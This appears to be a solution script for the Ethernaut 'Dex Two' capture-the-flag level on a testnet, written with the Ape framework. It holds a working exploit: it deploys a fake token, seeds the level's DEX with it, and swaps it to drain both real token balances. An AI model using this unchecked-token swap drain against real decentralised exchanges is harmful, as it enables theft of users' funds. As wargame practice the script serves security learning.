from ape import accounts, project
from .utils.helper import get_level_instance, level_completed, MAX_UINT256


ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xF0751022c3765f9bCa97b88bF0986BFCAEbC5D9A"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user, gas=9000000)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.DexTwo.deploy("JayToken", "Jay", 1000000, instance, sender=user)

    contract = project.Dex.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    # get token addresses
    token1 = contract.token1()
    token2 = contract.token2()

    with accounts.use_sender(user):
        # approve instance from spend our tokens
        contract.approve(instance, MAX_UINT256)

        # approve instance to spend fake tokens
        hacker.approve(instance, MAX_UINT256)

        # add liquidity to instance
        hacker.transfer(instance, 100)

        assert contract.balanceOf(hacker, instance) == 100, "liq !added"

        # swap our fake tokens with all of token1 and token2
        contract.swap(hacker, token1, 100)

        assert contract.balanceOf(token1, instance) == 0, "token1 !0"

        contract.swap(hacker, token2, 200)

        assert contract.balanceOf(token2, instance) == 0, "token2 !0"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
